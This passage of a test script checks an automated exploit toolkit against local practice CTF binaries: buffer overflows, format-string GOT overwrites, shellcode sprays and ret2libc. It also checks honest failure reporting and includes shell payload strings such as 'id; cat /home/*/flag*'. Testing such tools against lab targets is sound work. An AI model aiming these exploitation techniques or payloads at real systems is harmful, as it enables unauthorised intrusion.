      "little-endian stack words")
check(fl.decode_and_find("nothing here AAAAAAAAAAAAAAAAAAAAAAAA 0x41414141", strong_only=True) == (None, None), "noise became a flag")
# a GOT slot whose +2 address ends in 0x0a: no piece may carry that byte
cx = fp.Ctx(None, 32, 4, 0, 255)
pieces = cx.split(0x804c008, 0xf7dae000, 4)
check(all(b"\n" not in cx.pack(a) for a, _v, _n in pieces) and b"\n" not in cx.write_payload(pieces), f"0x0a in a write address {pieces}")
got = bytearray(4)
for a, v, n in pieces:
    got[a - 0x804c008:a - 0x804c008 + n] = v.to_bytes(n, "little")
check(bytes(got) == (0xf7dae000).to_bytes(4, "little"), "pieces do not reassemble to the value")
sys.exit(1 if bad else 0)
PYR5
sv randguard32 35081 "SIT{r34d_th3_c0d3_3v3ry_t1m3}"     "random guard value read from the banner, same connection"
ss randguard64 35082 "SIT{r4nd0m_gu4rd_64}"              "same, 64-bit, from SOURCE only"
sv randarg32   35083 "SIT{w1n_k3y_ch4ng3s_d41ly}"        "win(key) with a per-connection key"
sv gatedfmt32  35084 "SIT{g4t3_th3n_f0rm4t_str1ng}"      "arithmetic gate in front of a format-string bug"
sv hexwin32    35085 "SIT{pr1nt3d_4s_h3x_n0t_l0st}"      "flag printed as hex: decoded, not mis-decoded"
sv revwin32    35086 "SIT{b4ckw4rds_1s_st1ll_4_fl4g}"    "flag printed reversed: a success is not reported as a failure"
sv fmtloop32   35087 "SIT{l4b_l4st_3x3rc1s3_w1th_4slr}"  "lab's last exercise: GOT -> system, libc leaked through the GOT"
sv tight64     35088 "SIT{n0_r00m_f0r_th3_r3t_g4dg3t}"   "read stops at the return address: aligned by entering win() past push rbp"
sv smalldec32  35089 "SIT{lucky_numb3r_1s_tw0_d1g1ts}"   "run-time guard announced as a small decimal in a sentence"
"$PY" - <<'PYR6' && ok "late entry is the instruction after push rbp; short decimals rank after hex" || bad "a round-6 derivation is wrong"
import sys
sys.path.insert(0, ".")
import auto_pwn as ap
from elftool import ELF
w = ELF("testbed/tight64").win_symbols["win"]
assert ap.late_entry("testbed/tight64", w) == w + 1, hex(ap.late_entry("testbed/tight64", w) or 0)
assert ap.banner_numbers(b"1) menu 2) quit. lucky number 42, code 0xbeef1234") == [0xbeef1234, 1, 2, 42]
PYR6

say "ANTI-SCRIPT (round 7): a login before a format bug, mixed win() arguments, announced write value"
"$PY" - <<'PYR7' && ok "run-time win() argument told apart from a 64-bit constant loaded by mov" || bad "a round-7 derivation is wrong"
import sys
sys.path.insert(0, ".")
import auto_pwn as ap
yes = [n for n in ("randarg32", "randarg2_32", "randarg64") if not ap.win_wants_runtime_arg("testbed/" + n)]
no = [n for n in ("twoarg64", "threearg64", "winarg64", "twoarg32", "strarg64", "align64", "shellwin64", "decoywin32")
      if ap.win_wants_runtime_arg("testbed/" + n)]
if yes or no:
    print("   DECISION WRONG: missed run-time arg in", yes, "/ constant taken for run-time in", no)
    sys.exit(1)
assert ap.extract_win_args("testbed/randarg2_32") == [0xC0DE], ap.extract_win_args("testbed/randarg2_32")
PYR7
sv loginfmt32     35091 "SIT{l0g1n_th3n_f0rm4t_str1ng}"    "format-string bug found and exploited behind a login"
sv randarg2_32    35092 "SIT{0n3_c0nst4nt_0n3_4nn0unc3d}"  "win(a, b): one constant from the binary, one value from the banner"
sv randarg64      35093 "SIT{4nn0unc3d_k3y_p0p_rd1}"       "announced win() key on 64-bit"
sv fmtrandlocal32 35094 "SIT{wr1t3_wh4t_th3_b4nn3r_s4ys}"  "%n write of a value announced per connection"

say "NO FILES AT ALL (how live 5002 shipped): guards solved from host and port only"
sb(){ # sb <clone> <port> <flag> <label>   - solve.py with neither --binary nor --source
  local P; P=$(srv "$1" "$2"); waitport "$2"
  timeout 150 "$PY" solve.py 127.0.0.1 "$2" --run 2>/dev/null \
    | tr -d '\0' | grep -qF "$3" && ok "$4" || bad "$4"
  stop "$P"
}
sb adjone32    35101 "SIT{l3v3l_must_b3_3x4ctly_1}"    "no files: 'need 1' read from the refusal and sprayed"
sb randguard32 35102 "SIT{r34d_th3_c0d3_3v3ry_t1m3}"   "no files: announced code sprayed, no offset known"
sb smalldec32  35103 "SIT{lucky_numb3r_1s_tw0_d1g1ts}" "no files: small decimal code sprayed"
sb adjbool64   35104 "SIT{4uth3nt1c4t3d_64}"           "no files: if (authenticated) - on purpose, not via a stray probe"
sb labcalc64   35225 "SIT{c0mput3_th3_d1st4nc3}"        "no files: offset line removed - distance computed from the two printed stack addresses"
sb twoprompt64 35226 "SIT{s3c0nd_pr0mpt_1s_th3_bug}"    "no files: harmless Name prompt first; win() and offset printed after it"
sb twoquiet64  35227 "SIT{n0_0ffs3t_s3c0nd_pr0mpt}"     "no files: second-prompt overflow, no offset printed (64-bit told from 0x40xxxx)"
sb namebuf32   35232 "SIT{buff3r_4ddr_4ft3r_th3_n4m3}"  "no files: buffer address printed after a Name prompt - spray aimed past the prompt"
sb bufleak32   35107 "SIT{l4b_n0p_sl3d_buff3r_4ddr}"   "no files: shellcode with the return address sprayed, 32-bit"
sb bufleak64   35108 "SIT{buff3r_4ddr_64}"             "no files: same, word size taken from the printed pointer"
sb bufsmall32  35109 "SIT{sh3llc0d3_4ft3r_th3_r3t}"    "no files: 16-byte buffer, sled lands after the sprayed addresses"
# An HONEST failure must say what it means. varsrc compares with 0x1337c0de and never
# prints it: unsolvable with no files, but the overflow visibly reaches the variable.
P=$(srv varsrc 35105); waitport 35105
O=$(timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 35105 --goal var --frame-only 2>&1); RC=$?
{ [ "$RC" != 0 ] && ! echo "$O" | grep -q '^\[+\] FLAG'; } && ok "no flag invented when the value is never announced" || bad "false flag on an unannounced guard"
echo "$O" | grep -q "DIAGNOSIS: the overflow REACHES a variable" \
  && ok "says the overflow reaches the variable and only the value is missing" || bad "honest failure gives no diagnosis"
# "At the end" means: the block is present AND its closing rule is the very last line.
# (An earlier form used `tail -10`, which broke the day a second, equally true diagnosis
# made the block longer than ten lines.)
O=$(timeout 200 "$PY" solve.py 127.0.0.1 35105 --run --timeout 60 2>&1)
{ echo "$O" | grep -q "READ THIS FIRST" && echo "$O" | tail -1 | grep -q '^==========' ; } \
  && ok "solve.py repeats the diagnosis at the END, after the failed candidates" || bad "diagnosis buried"
timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 35105 --goal var --frame-only --value 0x1337c0de 2>/dev/null \
  | grep -qF "SIT{var_from_source}" && ok "--value alone solves it: still no offset and no files" || bad "--value with no files"
stop "$P"
# Same audit for ret2win: no files, no address. Unsolvable - but the overflow and its
# rough offset ARE measurable blind, and the failure must say so.
P=$(srv shellwin32 35106); waitport 35106
O=$(timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 35106 --goal ret2win --crash-oracle 2>&1)
echo "$O" | grep -q "DIAGNOSIS: input longer than [0-9]* bytes CRASHES the service" \
  && ok "blind ret2win failure reports the measured overflow and what is missing" || bad "no diagnosis for a blind overflow"
echo "$O" | grep -q '^\[+\] FLAG' && bad "flag invented with no address" || ok "no flag invented with no address"
W=$("$PY" -c "from elftool import ELF; print(hex(ELF('testbed/shellwin32').win_symbols['win']))")
timeout 90 "$PY" auto_pwn.py --host 127.0.0.1 --port 35106 --goal ret2win --addr "$W" --offset-start 48 --offset-end 88 --step 4 2>/dev/null \
  | grep -qF "SIT{w1n_1s_4_sh3ll_typ3_c4t}" && ok "the command the diagnosis prints works once an address is known" || bad "diagnosis command does not work"
stop "$P"

say "NEGATIVE: a service that only ECHOES must never be reported as a shell"
"$PY" - <<'PYSH' && ok "shell evidence is the command's OUTPUT, not its text" || bad "shell confirmation accepts an echo"
import sys
sys.path.insert(0, ".")
from flags import shell_confirmed as sc
import flags as _fl
assert not sc("===SHELL===\nSIT{x}\n")                              # round 50: a word-splitting service prints this too
assert sc("===SHELL===\nSIT{x}\n" + _fl.PROOF_OUT + "\n")            # the computed proof: only execution prints it
assert sc("uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n")          # id's output
assert sc("echo ===SHELL===; id\n===SHELL===\nuid=0(root)\n")        # pty echo + real output
assert not sc("You said: echo ===SHELL===; id; cat flag*\n")         # an echo service
assert not sc("> echo ===SHELL===; id; cat /home/*/flag* 2>/dev/null\n")
assert not sc("uid= not set\n")
PYSH
P=$(srv echoloop32 35111); waitport 35111
timeout 60 "$PY" ret2shell.py --host 127.0.0.1 --port 35111 --spray 2>/dev/null | grep -q "shell confirmed" \
  && bad "address spray 'confirmed a shell' on a program with no bug" || ok "address spray: no shell claimed on an echo service"
timeout 60 "$PY" ret2shell.py --binary testbed/echoloop32 --host 127.0.0.1 --port 35111 --offset 268 2>/dev/null \
  | grep -q "shell confirmed" && bad "buffer-address layout 'confirmed a shell' on a program with no bug" \
  || ok "buffer-address layout: no shell claimed on an echo service"
O=$(timeout 240 "$PY" solve.py 127.0.0.1 35111 --binary testbed/echoloop32 --run --timeout 90 2>&1); RC=$?
{ [ "$RC" = 2 ] && ! echo "$O" | grep -q "SOLVED"; } && ok "solve.py does not report SOLVED on a program with no bug (exit $RC)" \
  || bad "solve.py reported SOLVED (or exit $RC) on a program with no bug"
stop "$P"
# The same negative for the paths added in rounds 31-33 (shellcode / ret2libc aimed at a
# LATER prompt): a harmless Name prompt, then a bounded echo loop. No bug, executable stack.
P=$(srv echoname32 35231); waitport 35231
O=$(timeout 240 "$PY" solve.py 127.0.0.1 35231 --binary testbed/echoname32 --run --timeout 120 2>&1); RC=$?
stop "$P"
{ [ "$RC" != 0 ] && ! echo "$O" | grep -q "SOLVED\|shell confirmed"; } && ok "no SOLVED on a two-prompt echo service with no bug (later-prompt shellcode paths)" \
  || bad "a later-prompt path reported success on a program with no bug"
echo "$O" | grep -q "ret2shellcode at read #2" && ok "...and the later-prompt shellcode path really ran there" || bad "negative did not exercise the later-prompt path"
P=$(srv echoname32 35233); waitport 35233
O=$(timeout 240 "$PY" solve.py 127.0.0.1 35233 --run --timeout 120 2>&1); RC=$?
stop "$P"
{ [ "$RC" != 0 ] && ! echo "$O" | grep -q "SOLVED\|shell confirmed"; } && echo "$O" | grep -q "spray at read #2" \
  && ok "no files: the spray past a prompt ran on the no-bug service and claimed nothing" || bad "no-files spray: false success, or the path never ran"

say "NEGATIVE: flag-shaped text in the BANNER is not a flag"
"$PY" - <<'PYDECOY' && ok "banner decoys ignored in every decoding; sentences are not flags" || bad "decoy flag derivation wrong"
import sys
sys.path.insert(0, ".")
import flags as fl
f = lambda t: fl.decode_and_find(t, strong_only=True)[0]
# `flag is <english word>` is a sentence; a token with a digit/underscore, or a long one, is a flag
assert f("The flag is locked away. Overflow me.") is None
assert f("Sorry, the flag is still hidden.") is None
assert f("the flag is r34l_0n3") == "r34l_0n3"
assert f("the flag is 764c6759dc7d87cf27f5cd043e167e77") == "764c6759dc7d87cf27f5cd043e167e77"
# a format hint registered from the banner is ignored - directly AND through rot13/reversal/base64
assert fl.learn_ignore(b"Flag format: SIT{xxxxxxxxxxxxxxxx}. Good luck.") == ["SIT{xxxxxxxxxxxxxxxx}"]
assert f("Flag format: SIT{xxxxxxxxxxxxxxxx}. Good luck.\nData: bye") is None, f("Flag format: SIT{xxxxxxxxxxxxxxxx}. Good luck.\nData: bye")
assert f("Flag format: SIT{xxxxxxxxxxxxxxxx}.\nWell done: SIT{th3_r34l_0n3}") == "SIT{th3_r34l_0n3}"
PYDECOY
for n in decoyfmt32 decoytaunt32; do
  case $n in decoyfmt32) port=35121; real="SIT{th3_r34l_0n3_n0t_th3_h1nt}";; *) port=35123; real="SIT{n0t_l0ck3d_4ny_m0r3}";; esac
  P=$(srv $n $port); waitport $port
  O=$(timeout 150 "$PY" solve.py 127.0.0.1 $port --binary testbed/$n --run 2>/dev/null | tr -d '\0')
  echo "$O" | grep -a '^\[+\] FLAG' | head -1 | grep -qF "$real" \
    && ok "$n: the FIRST flag reported is the real one, not the banner's" || bad "$n: banner text reported as the flag"
  O=$(timeout 240 "$PY" solve.py 127.0.0.1 $port --run --timeout 60 2>&1); RC=$?
  { [ "$RC" = 2 ] && ! echo "$O" | grep -q "SOLVED"; } \
    && ok "$n with no files: unsolvable, and nothing is claimed (exit $RC)" || bad "$n with no files: false SOLVED (exit $RC)"
  stop "$P"
done

say "BEGINNER-PROOF: every command the triage PRINTS runs when pasted"
# Triage prints commands for a human to copy. One of them carried the placeholder
# `--budget AUTO`, which only solve.py itself knew how to fill in - pasted, it crashed.
for n in fmtloop32 randguard32 tight64 fmtsmall32 adjcmd32 bufleak32; do
  case $n in fmtloop32) port=35131;; randguard32) port=35132;; tight64) port=35133;; fmtsmall32) port=35134;; adjcmd32) port=35135;; *) port=35136;; esac
  P=$(srv $n $port); waitport $port
  "$PY" - "$n" "$port" <<'PYPASTE' && ok "$n: every printed command parses its own arguments" || bad "$n: a printed command cannot be pasted"
import re, shlex, subprocess, sys
n, port = sys.argv[1], sys.argv[2]
out = subprocess.run([sys.executable, "solve.py", "127.0.0.1", port, "--binary", f"testbed/{n}"],
                     capture_output=True, text=True, timeout=90).stdout
cmds = [l.split("cmd:", 1)[1].strip() for l in out.splitlines() if l.strip().startswith("cmd:")]
if not cmds:
    print("   no commands printed at all"); sys.exit(1)
bad = 0
for c in cmds:
    argv = shlex.split(c)
    # --dry-run where the tool has one; otherwise --help still exercises argparse on... nothing,
    # so instead run the parser for real with an unreachable port swapped in.
    argv = [a if a != port else "1" for a in argv]
    r = subprocess.run(argv + (["--dry-run"] if "auto_pwn.py" in c or "ret2shell.py" in c else []),
                       capture_output=True, text=True, timeout=60)
    if "error: argument" in r.stderr or "unrecognized arguments" in r.stderr or "invalid" in r.stderr.lower() and "usage:" in r.stderr:
        print("   CANNOT BE PASTED:", c[:140]); print("     ", r.stderr.strip().splitlines()[-1][:140]); bad += 1
sys.exit(1 if bad else 0)
PYPASTE
  stop "$P"
done

say "NEGATIVE: verify.py against the WRONG program reports no shift"
# The audit question from round 11, asked of the last success message: what would make it
# say "shift" when there is none? A service that is a different program entirely.
for pair in "echoloop32:35141" "decoyfmt32:35142"; do
  n=${pair%%:*}; port=${pair##*:}
  P=$(srv $n $port); waitport $port
  O=$(timeout 90 "$PY" verify.py --binary testbed/chatty_echo-pad --host 127.0.0.1 --port $port 2>&1); RC=$?
  { [ "$RC" != 0 ] && ! echo "$O" | grep -q "exploit-shift -\|exploit-shift +0x[1-9a-f]\|remote binary == local"; } \
    && ok "verify.py vs $n (a different program): no shift and no 'same build' claimed (exit $RC)" \
    || bad "verify.py claimed something about a program that is not the binary"
  stop "$P"
done

say "BEGINNER-PROOF: commands printed on the FAILURE path run when pasted"
# Round 13 covered triage. A failed --run prints its own list ("RANKED CANDIDATES (not
# run) - run one of these by hand") and that is the list you would actually copy from
# when the automatic attempt has not worked.
P=$(srv echoloop32 35143); waitport 35143
"$PY" - 35143 <<'PYFAILPASTE' && ok "every command in the failure template parses its own arguments" || bad "a failure-path command cannot be pasted"
import re, shlex, subprocess, sys
port = sys.argv[1]
out = subprocess.run([sys.executable, "solve.py", "127.0.0.1", port, "--binary", "testbed/echoloop32",
                      "--run", "--timeout", "60"], capture_output=True, text=True, timeout=200).stdout
if "RANKED CANDIDATES" not in out:
    print("   the failure template was not printed"); sys.exit(1)
tail = out.split("RANKED CANDIDATES", 1)[1]
cmds = [l.strip() for l in tail.splitlines() if re.match(r"\s+\S*python3?\S* \S+\.py ", l)]
if len(cmds) < 3:
    print("   only", len(cmds), "commands found in the template"); sys.exit(1)
bad = 0
for c in cmds:
    try:
        argv = shlex.split(c)
    except ValueError as exc:
        print("   UNBALANCED QUOTING:", c[:140], exc); bad += 1; continue
    argv = [a if a != port else "1" for a in argv]
    extra = ["--dry-run"] if ("auto_pwn.py" in c or "ret2shell.py" in c) else []
    r = subprocess.run(argv + extra, capture_output=True, text=True, timeout=60)
    if "usage:" in r.stderr and "error:" in r.stderr:
        print("   CANNOT BE PASTED:", c[:150]); print("     ", r.stderr.strip().splitlines()[-1][:150]); bad += 1
print(f"   {len(cmds)} failure-path commands checked")
sys.exit(1 if bad else 0)
PYFAILPASTE
stop "$P"

say "LATENCY: the exam host is not localhost (150 ms each way, through testbed/lagproxy.py)"
# Every other row here talks to 127.0.0.1 in microseconds. The practice host was a cloud
# machine ~230 ms away. Two clones that solve in 3 s locally FAILED through this proxy:
# one ran out of its time cap (40 sequential connections at a second each), one misread a
# reply that arrived just after a 0.35 s first-byte timeout and declared "not a format
# string". A sample is gated; `lagsweep` in bof.md "Round 15" covers all of them.
svlag(){ # svlag <clone> <server port> <proxy port> <flag> <label> [solve args]
  local P Q; P=$(srv "$1" "$2"); waitport "$2"
  "$PY" testbed/lagproxy.py --listen "$3" --to "$2" --delay 0.15 --jitter 0.03 >/dev/null 2>&1 & Q=$!
  waitport "$3"
  timeout 240 "$PY" solve.py 127.0.0.1 "$3" ${6:---binary testbed/$1} --run 2>/dev/null \
    | tr -d '\0' | grep -qF "$4" && ok "$5" || bad "$5"
  stop "$Q"; stop "$P"
}
svlag fmtsecret32   35151 35152 "SIT{l4b_4tt4ck1_p01nt3r_0n_st4ck}" "over latency: %s scan (was: out of time)"
svlag fmtcanary32   35153 35154 "SIT{fmt_l34ks_c4n4ry_th3n_b0f}"    "over latency: format leak then overflow (was: out of time)"
svlag fmtgotshell32 35155 35156 "SIT{g0t_t0_4_sh3ll_w1n}"           "over latency: GOT -> shell (was: 'not a format string')"
svlag fmtloop32     35157 35158 "SIT{l4b_l4st_3x3rc1s3_w1th_4slr}"  "over latency: libc leak + GOT -> system in one connection"
svlag randguard32   35159 35160 "SIT{r34d_th3_c0d3_3v3ry_t1m3}"     "over latency: announced guard value"
svlag bufleak32     35161 35162 "SIT{l4b_n0p_sl3d_buff3r_4ddr}"     "over latency, no files: shellcode address spray" "--timeout 120"
svlag menu32        35163 35164 "SIT{m3nu_n4v1g4t3d}"               "over latency: an older shape (menu walk)"
# 300 ms each way (600 ms round trip): the probes solve.py itself sends must wait for a
# first byte that far away, and a technique behind two login prompts needs a longer cap.
P=$(srv loginfmt32 35165); waitport 35165
"$PY" testbed/lagproxy.py --listen 35166 --to 35165 --delay 0.30 --jitter 0.03 >/dev/null 2>&1 & Q=$!
waitport 35166
timeout 300 "$PY" solve.py 127.0.0.1 35166 --binary testbed/loginfmt32 --run 2>/dev/null | tr -d '\0' \
  | grep -qF "SIT{l0g1n_th3n_f0rm4t_str1ng}" && ok "at 300 ms each way: login, then a format bug (caps scale with the link)" \
  || bad "slow link: login + format bug"
stop "$Q"; stop "$P"
"$PY" - <<'PYLAG' && ok "first-byte wait scales with the measured link; idle between chunks does not shrink" || bad "timeout scaling wrong"
import sys, socket, threading, time
sys.path.insert(0, ".")
import fmtpwn as fp
# a server that answers 0.5 s after the request - slower than the old fixed 0.35 s wait
ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); ls.bind(("127.0.0.1", 0)); ls.listen(4)
def serve():
    while True:
        c, _ = ls.accept()
        def h(c=c):
            try:
                time.sleep(0.5); c.sendall(b"Say: ")
                d = c.recv(4096); time.sleep(0.5); c.sendall(b"You said " + d)
            except OSError: pass
            finally: c.close()
        threading.Thread(target=h, daemon=True).start()
threading.Thread(target=serve, daemon=True).start()
t = fp.Target("127.0.0.1", ls.getsockname()[1])
out = t.shot(fp.M1 + b"hello" + fp.M2, post=(), until=fp.M2)
assert t.rtt >= 0.4, f"link delay not measured: {t.rtt}"
assert fp.between(out) == b"hello", f"a reply 0.5 s away was missed: {out!r}"
PYLAG

say "DEAD TIME: a scan that cannot work is not started"
# On an unsolvable target the two older format-string probes used to burn a full cap each
# (40-60 s of a run, more over a slow link) on services that echo %p back literally.
P=$(srv echoloop32 35171); waitport 35171
t0=$(date +%s)
O=$(timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 35171 --mode fmt --goal fmt-leak 2>&1); RC=$?
{ [ "$RC" = 1 ] && echo "$O" | grep -q "back literally" && [ $(( $(date +%s) - t0 )) -le 8 ]; } \
  && ok "literal %p echo: fmt-leak declines in one connection ($(( $(date +%s) - t0 ))s)" || bad "fmt-leak scanned a non-format-string service (exit $RC, $(( $(date +%s) - t0 ))s)"
t0=$(date +%s)
timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 35171 --mode fmt --goal fmt-write >/dev/null 2>&1
[ $(( $(date +%s) - t0 )) -le 8 ] && ok "literal %p echo: fmt-write declines too" || bad "fmt-write scanned a non-format-string service"
stop "$P"
# ...and the real ones must be untouched: the Echo Chamber shape still leaks, a genie-style
# blind write still writes.
P=$("$PY" testbed/server.py "$HERE/../sandbox/h4_fmt64" --port 35172 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!); waitport 35172
timeout 120 "$PY" auto_pwn.py --host 127.0.0.1 --port 35172 --mode fmt --goal fmt-leak --arch amd64 2>/dev/null \
  | grep -qi "flag{h3ld_0ut_4" && ok "a real format-string leak still solves after the pre-check" || bad "pre-check broke a real fmt leak"
stop "$P"

say "EXAM MACHINE: the tools start on an older Python, and a missing objdump is SAID"
"$PY" compat.py >/dev/null 2>&1 && ok "compat.py passes here" || bad "compat.py fails on this machine"
"$PY" - <<'PYCOMPAT' && ok "compat.py detects 3.12-only f-strings (and accepts the 3.11-valid forms)" || bad "compat checker cannot detect what it exists for"
import os, sys, tempfile
sys.path.insert(0, ".")
import compat
d = tempfile.mkdtemp()
bad = os.path.join(d, "bad.py"); good = os.path.join(d, "good.py")
open(bad, "w").write('d = {"a": 1}\nx = f"{d["a"]}"\ny = f"{"|".join(["a"])}"\nz = f"{\'\\\\n\'.join([\'a\'])}"\n')
open(good, "w").write('d = {"a": 1}\nx = f"{d[\'a\']} {\'|\'.join([\'a\'])}"\ny = f"""{d["a"]}"""\n')
lines = sorted({l for l, _ in compat.fstring_problems(bad)})
assert lines == [2, 3, 4], lines
assert compat.fstring_problems(good) == [], compat.fstring_problems(good)
PYCOMPAT
# A machine with no binutils: solve.py must SAY so, at the top and again at the end.
NB=$(mktemp -d /tmp/nobin_XXXXXX)
for p in python3 bash sh env timeout cat grep sed awk head tail cut tr sleep date seq mktemp rm ls id find echo; do
  w=$(command -v $p) && ln -s "$w" "$NB/$p"; done
P=$(srv adjone32 35181); waitport 35181
O=$(PATH=$NB timeout 200 "$PY" solve.py 127.0.0.1 35181 --binary testbed/adjone32 --run --timeout 60 2>&1)
stop "$P"; rm -rf "$NB"
echo "$O" | head -12 | grep -q "NOT INSTALLED: objdump" && ok "no objdump: said at the top, with the fix" || bad "missing objdump not reported"
echo "$O" | tail -12 | grep -q "DIAGNOSIS: objdump.* not installed" && ok "no objdump: repeated in READ THIS FIRST at the end" || bad "missing objdump not in the final diagnosis"

say "EXAM MACHINE: smoke.sh tells broken TOOLS apart from a machine that cannot build or run PRACTICE targets"
# No compiler (an exam PC has no reason to have gcc -m32): every tool check passed and the
# verdict used to be "SOMETHING IS BROKEN - run selftest.sh".
NB=$(mktemp -d /tmp/nobin_XXXXXX)
for p in python3 bash sh env timeout cat grep sed awk head tail cut tr sleep date seq mktemp rm ls id find echo objdump readelf strings nm kill printf dirname basename wc sort uniq; do
  w=$(command -v $p 2>/dev/null) && [ -x "$w" ] && ln -s "$w" "$NB/$p"; done
O=$(PATH=$NB bash smoke.sh 2>&1 | sed 's/\x1b\[[0-9;]*m//g'); RC=$?
rm -rf "$NB"
{ echo "$O" | tail -1 | grep -q "^TOOLKIT OK  (with notes" && echo "$O" | grep -q "cannot rebuild the practice clones"; } \
  && ok "no gcc/make: TOOLKIT OK with a note, not 'SOMETHING IS BROKEN'" || bad "smoke.sh reports a missing compiler as a broken toolkit"
# No 32-bit runtime: the 32-bit live rows cannot run, the static and 64-bit ones can.
O=$(SMOKE_NO32=1 bash smoke.sh 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
{ echo "$O" | tail -1 | grep -q "^TOOLKIT OK  (with notes" && echo "$O" | grep -q "64-bit ret2win with an argument" \
    && echo "$O" | grep -q "static analysis of 32- and 64-bit binaries"; } \
  && ok "no 32-bit runtime: static + 64-bit checks still run, verdict is OK with a note" || bad "smoke.sh cannot cope without a 32-bit runtime"
# ...and a genuinely broken tool must still FAIL: break a copy and run the smoke check on it.
BR=$(mktemp -d /tmp/broke_XXXXXX); cp -r *.py *.sh "$BR/"; mkdir -p "$BR/testbed"; cp -r testbed/. "$BR/testbed/"
echo "def broken(:" >> "$BR/auto_pwn.py"
O=$(cd "$BR" && SMOKE_NO32=1 bash smoke.sh 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
rm -rf "$BR"
echo "$O" | tail -1 | grep -q "SOMETHING IS BROKEN" && ok "a tool that does not parse still fails the smoke check" \
  || bad "smoke.sh passed a broken tool"

say "OTHER TOOLCHAIN (found by rebuilding everything on Debian 12 / gcc 12 / Python 3.11)"
"$PY" - <<'PYR21' && ok "PIE gadgets are rebased; every Makefile rule is in 'all'; ret2libc survives a dropped variant" || bad "a round-21 regression"
import re, sys
sys.path.insert(0, ".")
import auto_pwn as ap
# 1. On PIE the alignment `ret` and `pop rdi` move with the load base. They were used at
#    their FILE offsets, which only mattered on a libc that faults on misalignment.
ap.pie_win_addrs.base = 0x555555554000
assert ap.pie_gadgets({"ret": [0x1016], "pop rdi; ret": [0x11c9]}) == {"ret": [0x555555555016], "pop rdi; ret": [0x5555555551c9]}
ap.pie_win_addrs.base = 0
assert ap.pie_gadgets({"ret": [0x401016]}) == {"ret": [0x401016]}
# 2. 19 clones had a build rule but were missing from `all`: a fresh `make` on another
#    machine silently left the old binaries (built against a newer libc) in place.
m = open("testbed/Makefile").read()
allt = set(next(l for l in m.split("\n") if l.startswith("all:")).split()[1:])
rules = set(re.findall(r"^([A-Za-z0-9_-]+):\s*\$\(SRC\)", m, re.M))
assert not (rules - allt), sorted(rules - allt)
# 3. ret2libc: a chain variant that closes the connection is the expected fate of half of
#    them and must lead to the next variant, not to a traceback.
src = open("ret2libc.py").read()
assert "closed the connection - trying the next one" in src and "except OSError" in src
PYR21
# align64's alignment check is now compiler-independent: the plain chain must FAIL and the
# realigned ones succeed (it used to depend on gcc 15's frame size).
"$PY" - <<'PYALIGN' && ok "align64: plain chain refused, late entry and ret-gadget both reach the flag" || bad "align64 fixture"
import struct, subprocess, sys
sys.path.insert(0, ".")
from elftool import ELF
e = ELF("testbed/align64"); win = e.win_symbols["win"]; ret = e.gadgets()["ret"][0]; off = e.report()["ret_offset_candidates"][0]
run = lambda chain: subprocess.run(["./align64"], input=b"A" * off + chain + b"\n", capture_output=True, cwd="testbed", timeout=8).stdout
assert b"SIT{" not in run(struct.pack("<Q", win))
assert b"SIT{" in run(struct.pack("<Q", win + 1)) and b"SIT{" in run(struct.pack("<QQ", ret, win))
PYALIGN

say "FOREIGN LIBC: a leak that does not fit the local libc is reported as a different libc"
# Found by attacking Debian-12-libc targets from this machine: ret2libc said the leak was
# "not puts()" and gave up. Reproduced here without a second machine by handing it the
# WRONG libc on purpose (the 64-bit one, for a 32-bit target).
P=$(srv ret2libc32 35191); waitport 35191
O=$(timeout 60 "$PY" ret2libc.py 127.0.0.1 35191 --binary testbed/ret2libc32 --libc /lib/x86_64-linux-gnu/libc.so.6 2>&1); RC=$?
{ [ "$RC" = 1 ] && echo "$O" | grep -q "DIAGNOSIS: the target runs a DIFFERENT libc" && echo "$O" | grep -q -- "--libc ./libc.so.6" \
    && ! echo "$O" | grep -q '^\[+\] FLAG\|shell confirmed'; } \
  && ok "wrong libc: named as such, with the command to use; nothing claimed" || bad "foreign libc not diagnosed (exit $RC)"
timeout 60 "$PY" ret2libc.py 127.0.0.1 35191 --binary testbed/ret2libc32 --cmd 'echo ===SHELL===; cat flags/libc.txt' 2>/dev/null \
  | grep -q "SIT{r3t2l1bc_ch41n}" && ok "right libc: still solves" || bad "ret2libc regressed"
stop "$P"

say "THE PAPER (round 23): a value that is not on the wire is typed into a notes file, no flags"
"$PY" - <<'PYNOTES' && ok "notes.py reads 20 kinds of sentence as intended (sizes, offsets, addresses, sums, logins)" || bad "notes parser"
import sys
sys.path.insert(0, ".")
import notes
CASES = [
    ("The buffer is 64 bytes. win() is at 0x401186.", [("size", 64), ("address", 0x401186)], [("number", 64)]),
    ("char name[32]; the access code must equal 0x1337c0de", [("size", 32), ("number", 0x1337c0de)], []),
    ("Offset to the return address is 76.", [("offset", 76)], [("size", 76)]),
    ("padding = 0x48, then jump to 0x08049216", [("offset", 0x48), ("address", 0x08049216)], []),
    ("The key is 0x1000 + 0x337.", [("number", 0x1337)], []),
    ("code = 1337 xor 0x55", [("number", 1337 ^ 0x55)], []),
    ("Username: operator   Password: n1ghtsh1ft", [("text", "operator"), ("text", "n1ghtsh1ft")], []),
    ('Log in with the password "open sesame" first.', [("text", "open sesame")], []),
    ("Set target to 48213 to pass.", [("number", 48213)], []),
    ("Question 3 (10 marks). Overflow the 40-byte buffer and call the function at 0x80491f6 with argument 0xC0DE.",
     [("size", 40), ("address", 0x80491f6), ("number", 0xC0DE)], [("number", 3), ("number", 10)]),
    ("Your lucky number is 42.", [("number", 42)], []),
    ("The exam ends at 1700. Room 204.", [], [("address", 1700)]),
    ("buffer starts at 0xffffd0a0 and is 128 bytes long", [("address", 0xffffd0a0), ("size", 128)], []),
    ("win is located at 0x55555555521a (PIE disabled on the server)", [("address", 0x55555555521a)], []),
    ("The secret value is the buffer size (64) times 2.", [("number", 128)], []),
    ("Send 72 bytes of padding followed by the address 0x401196", [("offset", 72), ("address", 0x401196)], [("offset", 0x401196)]),
    ("", [], []),
    ("Good luck! No hints for this one.", [], []),
    ("The admin PIN is 0007.", [("number", 7)], []),
    ("level must be 1", [("number", 1)], []),
]
bad = 0
for text, want, forbid in CASES:
